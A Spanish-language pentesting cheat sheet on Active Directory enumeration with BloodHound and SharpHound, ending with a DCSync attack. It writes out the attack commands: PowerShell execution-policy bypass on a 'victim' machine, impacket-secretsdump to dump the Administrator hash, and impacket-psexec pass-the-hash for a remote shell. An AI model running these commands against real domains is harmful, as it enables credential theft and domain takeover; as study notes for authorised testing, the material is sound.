# BloodHound 

Tags: #AD #Powershell #Windows #Enumeracion 

Bloodhound es una app en JavaScript la cual puede identificar fácilmente ataques altamente complejo que de otro modo seria imposible identificar ademas puede identificar grupos con permisos excesivos. Los defensores pueden usar Bloohound para identificar y eliminar esas mismas rutas de ataque. 

```bash 
# Descargamos la utilidad en nuestra maquina de atacante para despues pasar el archivo a la maquina victima que esta utilizando PowerShell

❯ wget https://raw.githubusercontent.com/puckiestyle/powershell/master/SharpHound.ps1 
```

```powershell 
# En la maquina victima con PS. Hacemos lo siguiente para la recoleccion de data

❯ powershell -ep bypass                      # Politica que nos permite ejecutar scripts en Powershell
 	# ep = Ejecutar politicas 

# Enumeracion 
❯ . .\SharpHound.ps1                         # Importamos el modulo 
❯ Import-Module .\SharpHound.ps1             # Otra forma de importar el modulo  

❯ Invoke-Bloodhound -CollectionMethod All    # Utilizamnos la funcion 'Invoke' para crear el archivo  '2024_bloodhound.zip' el cual usaremos en el GUI de la herramienta de Boolhound
```

## BloodHound en Kali 

```bash 
# Abrirmos la herramienta de Boodhound y cargamos el archivo '2024_bloodhound.zip'

❯ apt install neo4j bloodhound          # Instalar la herramienta en Kali 
❯ update-alternatives --config java     # Ver las versiones de Java y cual se esta utilizando (Se debe usar la version 11)

❯ neo4j console &> /dev/null & disown   # Iniciamos el servicio en el puerto local 7474 y lo independizamos
	# Nota: Si es la primera vez que lo usamos, abrimos la web 'localhost:7474' y agregamos las credenciales 'neo4j:neo4j', despues, agregamos una passwd nueva y asi podremos conectarnos al 'Bloodhound'

❯ bloodhound &> /dev/null & disown      # Abrimos el 'Bloodhound' para usar el GUI y cargar el archivo .ZIP
```

```bash 
# Otra forma de subir data a la plataforma de Bloodhound

❯ bloodhound-python -d Domain.local -u User -p Password -ns IP_DC -c all   # Ejecutamos para recopilar la data y asi poder subir el archivo a la plataforma de Bloodhound

Nota: Importamos todos los archivos que fueron generados en formato Json
```

## Ataques 'DCSync'

```bash 
# Si encontramos en 'Bloodhound' un usuario que tiene un 'GetChangesAll' sobre el dominio podremos hacer un 'DCSync attack' para obtener el hash del usuario 'Administrador' y por lo tanto efectuar un 'Pass-The-Hash'

❯ impacket-secretsdump <Domain/User@IP>    # Hacemos un ataque 'DCSync', debemos de colocar la passwd del usuario 
❯ impacket-psexec <Domain/Administrator@IP> cmd.exe -hashes <:hash>   # Utilizamos 'psexec' para obtener una consola interactiva autenticandonos como el usuario 'Administrator' y colocando su hash para hacer 'Pass-The-Hash'    
```